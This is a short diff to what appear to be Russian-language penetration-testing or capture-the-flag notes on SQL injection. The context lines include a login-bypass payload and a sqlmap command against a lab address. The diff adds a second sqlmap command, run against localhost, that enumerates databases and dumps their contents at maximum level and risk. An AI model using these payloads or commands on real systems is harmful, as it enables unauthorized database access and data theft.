@@ -7,6 +7,11 @@ admin'  or 1=1 or ''='
 ## show databases
 ```bash
 $ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST --dbs --batch
+
+или вот так:
+
+sqlmap -u 'http://127.0.0.1:8082/?id=0.0.1' --method GET --dbs --dump --level 5 --risk 3
+
 ```
 
 ```bash
